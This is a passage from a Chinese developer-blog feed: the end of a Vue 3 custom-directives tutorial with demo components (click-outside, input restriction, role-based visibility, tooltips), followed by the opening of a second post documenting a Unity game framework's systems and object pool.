  // 保持日志数量不超过20条
  if (logs.value.length &gt; 20) {
    logs.value.shift()
  }
}

// 完整的生命周期指令
const vLifecycleDemo = {
  created(el, binding) {
    addLog('created', el, binding)
    console.log('created - 指令创建，元素还未挂载')
  },
  
  beforeMount(el, binding) {
    addLog('beforeMount', el, binding)
    console.log('beforeMount - 元素挂载前')
    el.style.transition = 'all 0.3s ease'
  },
  
  mounted(el, binding) {
    addLog('mounted', el, binding)
    console.log('mounted - 元素挂载完成')
    console.log('修饰符:', binding.modifiers)
    console.log('参数:', binding.arg)
    
    // 添加动画效果
    el.style.opacity = '0'
    el.style.transform = 'translateY(-20px)'
    
    setTimeout(() =&gt; {
      el.style.opacity = '1'
      el.style.transform = 'translateY(0)'
    }, 100)
  },
  
  beforeUpdate(el, binding) {
    addLog('beforeUpdate', el, binding)
    console.log('beforeUpdate - 元素更新前')
  },
  
  updated(el, binding) {
    addLog('updated', el, binding)
    console.log('updated - 元素更新完成')
    
    // 更新时的动画
    el.style.backgroundColor = '#e3f2fd'
    setTimeout(() =&gt; {
      el.style.backgroundColor = ''
    }, 500)
  },
  
  beforeUnmount(el, binding) {
    addLog('beforeUnmount', el, binding)
    console.log('beforeUnmount - 元素卸载前')
    
    // 卸载动画
    el.style.opacity = '1'
    el.style.transform = 'translateY(0)'
    el.style.opacity = '0'
    el.style.transform = 'translateY(-20px)'
  },
  
  unmounted(el, binding) {
    addLog('unmounted', el, binding)
    console.log('unmounted - 元素卸载完成')
  }
}

const toggleDisplay = () =&gt; {
  isVisible.value = !isVisible.value
}

const changeMessage = () =&gt; {
  message.value = `消息已更新 ${Date.now()}`
  directiveValue.count++
}

const changeColor = () =&gt; {
  const colors = ['#ff4444', '#44ff44', '#4444ff', '#ff44ff', '#ffff44']
  elementColor.value = colors[Math.floor(Math.random() * colors.length)]
}
&lt;/script&gt;

&lt;style scoped&gt;
.demo-container {
  padding: 20px;
  max-width: 800px;
  margin: 0 auto;
}

.demo-element {
  padding: 20px;
  margin: 20px 0;
  border: 2px solid #42b983;
  border-radius: 8px;
  background: #f9f9f9;
}

.log-container {
  margin-top: 20px;
  padding: 15px;
  background: #f5f5f5;
  border-radius: 8px;
  max-height: 400px;
  overflow-y: auto;
}

.log-item {
  padding: 5px 10px;
  margin: 2px 0;
  background: white;
  border-radius: 4px;
  font-family: 'Courier New', monospace;
  font-size: 12px;
}

button {
  margin: 5px;
  padding: 8px 16px;
  background: #42b983;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

button:hover {
  background: #369870;
}
&lt;/style&gt;
</code></pre>
<hr/>
<h2 data-id="heading-16"><strong>五、 实用自定义指令示例</strong></h2>
<h3 data-id="heading-17"><strong>5.1 点击外部关闭指令</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="click-outside-demo"&gt;
    &lt;h2&gt;点击外部关闭演示&lt;/h2&gt;
    
    &lt;button @click="showDropdown = !showDropdown"&gt;
      切换下拉菜单 {{ showDropdown ? '▲' : '▼' }}
    &lt;/button&gt;

    &lt;div v-if="showDropdown" v-click-outside="closeDropdown" class="dropdown"&gt;
      &lt;div class="dropdown-item"&gt;菜单项 1&lt;/div&gt;
      &lt;div class="dropdown-item"&gt;菜单项 2&lt;/div&gt;
      &lt;div class="dropdown-item"&gt;菜单项 3&lt;/div&gt;
    &lt;/div&gt;

    &lt;div v-if="showModal" v-click-outside="closeModal" class="modal"&gt;
      &lt;div class="modal-content"&gt;
        &lt;h3&gt;模态框&lt;/h3&gt;
        &lt;p&gt;点击模态框外部可以关闭&lt;/p&gt;
        &lt;button @click="showModal = false"&gt;关闭&lt;/button&gt;
      &lt;/div&gt;
    &lt;/div&gt;

    &lt;button @click="showModal = true" style="margin-left: 10px;"&gt;
      打开模态框
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'

const showDropdown = ref(false)
const showModal = ref(false)

// 点击外部关闭指令
const vClickOutside = {
  mounted(el, binding) {
    el._clickOutsideHandler = (event) =&gt; {
      // 检查点击是否在元素外部
      if (!(el === event.target || el.contains(event.target))) {
        binding.value(event)
      }
    }
    document.addEventListener('click', el._clickOutsideHandler)
  },
  unmounted(el) {
    document.removeEventListener('click', el._clickOutsideHandler)
  }
}

const closeDropdown = () =&gt; {
  showDropdown.value = false
}

const closeModal = () =&gt; {
  showModal.value = false
}
&lt;/script&gt;

&lt;style scoped&gt;
.dropdown {
  position: absolute;
  top: 100%;
  left: 0;
  background: white;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
  z-index: 1000;
  margin-top: 5px;
}

.dropdown-item {
  padding: 10px 20px;
  cursor: pointer;
  border-bottom: 1px solid #eee;
}

.dropdown-item:hover {
  background: #f5f5f5;
}

.dropdown-item:last-child {
  border-bottom: none;
}

.modal {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.5);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 2000;
}

.modal-content {
  background: white;
  padding: 30px;
  border-radius: 8px;
  max-width: 400px;
  width: 90%;
}
&lt;/style&gt;
</code></pre>
<h3 data-id="heading-18"><strong>5.2 输入限制指令</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="input-restriction-demo"&gt;
    &lt;h2&gt;输入限制指令演示&lt;/h2&gt;
    
    &lt;div class="input-group"&gt;
      &lt;label&gt;仅数字输入：&lt;/label&gt;
      &lt;input v-number-only v-model="numberInput" placeholder="只能输入数字" /&gt;
      &lt;span&gt;值: {{ numberInput }}&lt;/span&gt;
    &lt;/div&gt;

    &lt;div class="input-group"&gt;
      &lt;label&gt;最大长度限制：&lt;/label&gt;
      &lt;input v-limit-length="10" v-model="limitedInput" placeholder="最多10个字符" /&gt;
      &lt;span&gt;值: {{ limitedInput }}&lt;/span&gt;
    &lt;/div&gt;

    &lt;div class="input-group"&gt;
      &lt;label&gt;禁止特殊字符：&lt;/label&gt;
      &lt;input v-no-special-chars v-model="noSpecialInput" placeholder="不能输入特殊字符" /&gt;
      &lt;span&gt;值: {{ noSpecialInput }}&lt;/span&gt;
    &lt;/div&gt;

    &lt;div class="input-group"&gt;
      &lt;label&gt;自动格式化手机号：&lt;/label&gt;
      &lt;input v-phone-format v-model="phoneInput" placeholder="输入手机号" /&gt;
      &lt;span&gt;值: {{ phoneInput }}&lt;/span&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'

const numberInput = ref('')
const limitedInput = ref('')
const noSpecialInput = ref('')
const phoneInput = ref('')

// 仅数字输入指令
const vNumberOnly = {
  mounted(el) {
    el.addEventListener('input', (e) =&gt; {
      e.target.value = e.target.value.replace(/[^\d]/g, '')
      // 触发 v-model 更新
      e.dispatchEvent(new Event('input'))
    })
  }
}

// 长度限制指令
const vLimitLength = {
  mounted(el, binding) {
    const maxLength = binding.value
    el.setAttribute('maxlength', maxLength)
    
    el.addEventListener('input', (e) =&gt; {
      if (e.target.value.length &gt; maxLength) {
        e.target.value = e.target.value.slice(0, maxLength)
        e.dispatchEvent(new Event('input'))
      }
    })
  }
}

// 禁止特殊字符指令
const vNoSpecialChars = {
  mounted(el) {
    el.addEventListener('input', (e) =&gt; {
      e.target.value = e.target.value.replace(/[^a-zA-Z0-9\u4e00-\u9fa5]/g, '')
      e.dispatchEvent(new Event('input'))
    })
  }
}

// 手机号格式化指令
const vPhoneFormat = {
  mounted(el) {
    el.addEventListener('input', (e) =&gt; {
      let value = e.target.value.replace(/\D/g, '')
      
      if (value.length &gt; 3 &amp;&amp; value.length &lt;= 7) {
        value = value.replace(/(\d{3})(\d+)/, '$1-$2')
      } else if (value.length &gt; 7) {
        value = value.replace(/(\d{3})(\d{4})(\d+)/, '$1-$2-$3')
      }
      
      e.target.value = value
      e.dispatchEvent(new Event('input'))
    })
  }
}
&lt;/script&gt;

&lt;style scoped&gt;
.input-restriction-demo {
  padding: 20px;
}

.input-group {
  margin: 15px 0;
}

label {
  display: inline-block;
  width: 150px;
  font-weight: bold;
}

input {
  padding: 8px;
  border: 1px solid #ddd;
  border-radius: 4px;
  margin: 0 10px;
  width: 200px;
}

span {
  color: #666;
  font-size: 14px;
}
&lt;/style&gt;
</code></pre>
<h3 data-id="heading-19"><strong>5.3 权限控制指令</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="permission-demo"&gt;
    &lt;h2&gt;权限控制指令演示&lt;/h2&gt;
    
    &lt;div class="user-info"&gt;
      &lt;label&gt;当前用户角色：&lt;/label&gt;
      &lt;select v-model="currentRole" @change="updatePermissions"&gt;
        &lt;option value="guest"&gt;游客&lt;/option&gt;
        &lt;option value="user"&gt;普通用户&lt;/option&gt;
        &lt;option value="editor"&gt;编辑者&lt;/option&gt;
        &lt;option value="admin"&gt;管理员&lt;/option&gt;
      &lt;/select&gt;
    &lt;/div&gt;

    &lt;div class="permission-list"&gt;
      &lt;h3&gt;可用功能：&lt;/h3&gt;
      
      &lt;button v-permission="'view'" class="feature-btn"&gt;
        🔍 查看内容
      &lt;/button&gt;
      
      &lt;button v-permission="'edit'" class="feature-btn"&gt;
        ✏️ 编辑内容
      &lt;/button&gt;
      
      &lt;button v-permission="'delete'" class="feature-btn"&gt;
        🗑️ 删除内容
      &lt;/button&gt;
      
      &lt;button v-permission="'admin'" class="feature-btn"&gt;
        ⚙️ 系统管理
      &lt;/button&gt;
      
      &lt;button v-permission="['edit', 'delete']" class="feature-btn"&gt;
        🔄 批量操作
      &lt;/button&gt;
    &lt;/div&gt;

    &lt;div class="current-permissions"&gt;
      &lt;h3&gt;当前权限：&lt;/h3&gt;
      &lt;ul&gt;
        &lt;li v-for="permission in currentPermissions" :key="permission"&gt;
          {{ permission }}
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref, reactive } from 'vue'

// 角色权限映射
const rolePermissions = {
  guest: ['view'],
  user: ['view', 'edit'],
  editor: ['view', 'edit', 'delete'],
  admin: ['view', 'edit', 'delete', 'admin']
}

const currentRole = ref('user')
const currentPermissions = ref(['view', 'edit'])

// 权限控制指令
const vPermission = {
  mounted(el, binding) {
    checkPermission(el, binding)
  },
  updated(el, binding) {
    checkPermission(el, binding)
  }
}

// 检查权限函数
const checkPermission = (el, binding) =&gt; {
  const requiredPermissions = Array.isArray(binding.value) 
    ? binding.value 
    : [binding.value]
  
  const hasPermission = requiredPermissions.some(permission =&gt; 
    currentPermissions.value.includes(permission)
  )
  
  if (!hasPermission) {
    el.style.display = 'none'
  } else {
    el.style.display = 'inline-block'
  }
}

// 更新权限
const updatePermissions = () =&gt; {
  currentPermissions.value = rolePermissions[currentRole.value] || []
}
&lt;/script&gt;

&lt;style scoped&gt;
.permission-demo {
  padding: 20px;
  max-width: 600px;
  margin: 0 auto;
}

.user-info {
  margin: 20px 0;
}

select {
  padding: 8px;
  border: 1px solid #ddd;
  border-radius: 4px;
  margin-left: 10px;
}

.permission-list {
  margin: 30px 0;
}

.feature-btn {
  display: inline-block;
  padding: 12px 20px;
  margin: 5px;
  background: #42b983;
  color: white;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  font-size: 14px;
  transition: background 0.3s;
}

.feature-btn:hover {
  background: #369870;
}

.current-permissions {
  margin-top: 30px;
  padding: 15px;
  background: #f5f5f5;
  border-radius: 8px;
}

.current-permissions ul {
  list-style: none;
  padding: 0;
}

.current-permissions li {
  padding: 5px 10px;
  background: white;
  margin: 5px 0;
  border-radius: 4px;
  border-left: 4px solid #42b983;
}
&lt;/style&gt;
</code></pre>
<hr/>
<h2 data-id="heading-20"><strong>六、 高级技巧与最佳实践</strong></h2>
<h3 data-id="heading-21"><strong>6.1 指令参数动态化</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;input v-tooltip="tooltipConfig" placeholder="悬浮显示提示" /&gt;
    
    &lt;div v-pin="pinConfig" class="pinned-element"&gt;
      可动态配置的固定元素
    &lt;/div&gt;
    
    &lt;button @click="updateConfig"&gt;更新配置&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref, reactive } from 'vue'

// 动态提示指令
const vTooltip = {
  mounted(el, binding) {
    const config = binding.value
    el.title = config.text
    el.style.cursor = config.cursor || 'help'
    
    if (config.position) {
      el.dataset.position = config.position
    }
  },
  updated(el, binding) {
    const config = binding.value
    el.title = config.text
  }
}

// 动态固定指令
const vPin = {
  mounted(el, binding) {
    updatePinPosition(el, binding)
  },
  updated(el, binding) {
    updatePinPosition(el, binding)
  }
}

const updatePinPosition = (el, binding) =&gt; {
  const config = binding.value
  el.style.position = 'fixed'
  el.style[config.side] = config.distance + 'px'
  el.style.zIndex = config.zIndex || 1000
}

const tooltipConfig = reactive({
  text: '这是一个动态提示',
  cursor: 'help',
  position: 'top'
})

const pinConfig = reactive({
  side: 'top',
  distance: 20,
  zIndex: 1000
})

const updateConfig = () =&gt; {
  tooltipConfig.text = `更新后的提示 ${Date.now()}`
  pinConfig.side = pinConfig.side === 'top' ? 'bottom' : 'top'
  pinConfig.distance = Math.random() * 100 + 20
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-22"><strong>6.2 指令组合与复用</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// directives/composable.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useClickHandlers</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      el.<span class="hljs-property">_clickHandler</span> = binding.<span class="hljs-property">value</span>
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_clickHandler</span>)
    },
    <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
      el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_clickHandler</span>)
    }
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useHoverHandlers</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      el.<span class="hljs-property">_mouseenterHandler</span> = binding.<span class="hljs-property">value</span>.<span class="hljs-property">enter</span>
      el.<span class="hljs-property">_mouseleaveHandler</span> = binding.<span class="hljs-property">value</span>.<span class="hljs-property">leave</span>
      
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_mouseenterHandler</span>) {
        el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseenter'</span>, el.<span class="hljs-property">_mouseenterHandler</span>)
      }
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_mouseleaveHandler</span>) {
        el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseleave'</span>, el.<span class="hljs-property">_mouseleaveHandler</span>)
      }
    },
    <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_mouseenterHandler</span>) {
        el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mouseenter'</span>, el.<span class="hljs-property">_mouseenterHandler</span>)
      }
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_mouseleaveHandler</span>) {
        el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mouseleave'</span>, el.<span class="hljs-property">_mouseleaveHandler</span>)
      }
    }
  }
}

<span class="hljs-comment">// 组合指令</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> vInteractive = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { click, hover } = binding.<span class="hljs-property">value</span>
    
    <span class="hljs-keyword">if</span> (click) {
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, click)
      el.<span class="hljs-property">_clickHandler</span> = click
    }
    
    <span class="hljs-keyword">if</span> (hover) {
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseenter'</span>, hover.<span class="hljs-property">enter</span>)
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseleave'</span>, hover.<span class="hljs-property">leave</span>)
      el.<span class="hljs-property">_hoverHandlers</span> = hover
    }
  },
  <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_clickHandler</span>) {
      el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_clickHandler</span>)
    }
    <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_hoverHandlers</span>) {
      el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mouseenter'</span>, el.<span class="hljs-property">_hoverHandlers</span>.<span class="hljs-property">enter</span>)
      el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mouseleave'</span>, el.<span class="hljs-property">_hoverHandlers</span>.<span class="hljs-property">leave</span>)
    }
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-23"><strong>七、 总结</strong></h2>
<h3 data-id="heading-24"><strong>7.1 核心要点回顾</strong></h3>
<ol>
<li><strong>生命周期钩子</strong>：Vue3 提供了 7 个生命周期钩子，覆盖了指令的完整生命周期</li>
<li><strong>参数传递</strong>：通过 <code>binding</code> 对象可以访问指令的值、参数、修饰符等信息</li>
<li><strong>多种定义方式</strong>：支持全局注册和局部注册，兼容选项式 API 和组合式 API</li>
<li><strong>灵活性</strong>：指令可以接收动态参数、对象值，支持复杂的交互逻辑</li>
</ol>
<h3 data-id="heading-25"><strong>7.2 最佳实践</strong></h3>
<ol>
<li><strong>命名规范</strong>：使用小写字母和连字符命名指令</li>
<li><strong>内存管理</strong>：在 <code>unmounted</code> 钩子中清理事件监听器和定时器</li>
<li><strong>性能优化</strong>：避免在指令中进行昂贵的 DOM 操作</li>
<li><strong>可复用性</strong>：将通用指令提取为独立模块</li>
<li><strong>类型安全</strong>：为指令提供 TypeScript 类型定义</li>
</ol>
<h3 data-id="heading-26"><strong>7.3 适用场景</strong></h3>
<ul>
<li><strong>DOM 操作</strong>：焦点管理、元素定位、动画控制</li>
<li><strong>输入处理</strong>：格式化、验证、限制</li>
<li><strong>用户交互</strong>：点击外部、滚动加载、拖拽</li>
<li><strong>权限控制</strong>：基于角色的元素显示/隐藏</li>
<li><strong>第三方集成</strong>：包装现有的 JavaScript 库</li>
</ul>
<p>自定义指令是 Vue.js 生态中一个非常强大的特性，合理使用可以极大地提高代码的复用性和可维护性。希望本文能帮助你全面掌握 Vue3 中的自定义指令！</p>
<hr/>
<p><strong>如果这篇文章对你有帮助，欢迎点赞、收藏和评论！有任何问题都可以在评论区讨论。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[游戏框架文档]]></title>    <link>https://juejin.cn/post/7575655132748120100</link>    <guid>https://juejin.cn/post/7575655132748120100</guid>    <pubDate>2025-11-23T05:31:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575655132748120100" data-draft-id="7575313772988104745" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="游戏框架文档"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T05:31:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户8922541182901"/> <meta itemprop="url" content="https://juejin.cn/user/1179135862128471"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            游戏框架文档
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1179135862128471/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户8922541182901
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T05:31:32.000Z" title="Sun Nov 23 2025 05:31:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1小时+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">框架启用和功能介绍</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95d678904af14e5bb1c005c050428fff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=3w0pQYTYh4C7nsGc6I%2Fo1sfJbhs%3D" alt="alt" loading="lazy"/>​</p>
<p>将框架预制体拖入Hierarchy中即可，脚本中使用时using JKframe命名空间，框架的github地址,为了避免框架中UI部分对Scene场景中交互产生干扰，建议把框架交互屏蔽掉。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94e08ccc0bd047ac8f56ace927a980b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=9YogGAsKgrHRD1ZaaVLHjlBhMt4%3D" alt="alt" loading="lazy"/>​</p>
<p>框架类似工具箱和插件，除了UI窗口外的大多情况下，并不需要继承什么类或接口，直接通过XXXSystem调用即可。主要功能系统：</p>
<ol start="0">
<li>
<p>对象池系统：重复利用GameObject或普通class实例，并且支持设置对象池容量</p>
</li>
<li>
<p>事件系统：解耦工具，不需要持有引用来进行函数的调用</p>
</li>
<li>
<p>资源系统</p>
<ul>
<li>Resources版本：关联对象池进行资源的加载卸载</li>
<li>Addressables版本：关联对象池进行资源的加载卸载，可结合事件工具做到销毁时自动从Addressables Unload</li>
</ul>
</li>
<li>
<p>MonoSystem：为不继承MonoBehaviour的对象提供Update、FixedUpdate、协程等功能</p>
</li>
<li>
<p>音效系统：背景音乐、背景音乐轮播、特效音乐、音量全局控制等</p>
</li>
<li>
<p>存档系统：</p>
<ul>
<li>支持多存档</li>
<li>自动缓存，避免频繁读磁盘</li>
<li>存玩家设置类数据，也就是不关联任何一个存档</li>
<li>支持二进制和Json存档，开发时使用Json调试，上线后使用二进制加密与减少文件体积</li>
</ul>
</li>
<li>
<p>日志系统：日志控制、保存等</p>
</li>
<li>
<p>UI系统：UI窗口的层级管理、Tips功能</p>
</li>
<li>
<p>场景系统：对Unity场景加载封装了一层，主要用于监听场景加载进度</p>
</li>
<li>
<p>本地化系统：分为全局配置和局部配置（随GameObject加载）、UI自动本地化收集器（Text、Image组件无需代码即可自动本地化）</p>
</li>
</ol>
<p>其他功能：</p>
<ol start="0">
<li>状态机：脚本逻辑状态机。</li>
<li>事件工具： 给物体添加点击、鼠标进入、鼠标拖拽、碰撞、触发、销毁等事件，而不需要额外在该物体上添加脚本等。</li>
<li>协程工具：协程避免GC。</li>
</ol>
<h2 data-id="heading-1">对象池</h2>
<p>在Unity中，对象的生成、销毁都需要性能开销，在一些特定的应用场景下需要进行大量重复物体的克隆，因此需要通过设计对象池来实现重复利用对象实例，减少触发垃圾回收。常用在频繁创建、销毁对象的情况下，比如子弹、AI生成等等、背包格子。</p>
<p>本框架的对象池系统有两类对象池（GameObject对象池和Object对象池）分别负责对需要在场景中实际激活/隐藏的GameObject和不需要显示在场景里的对象（脚本类、材质资源）进行管理。</p>
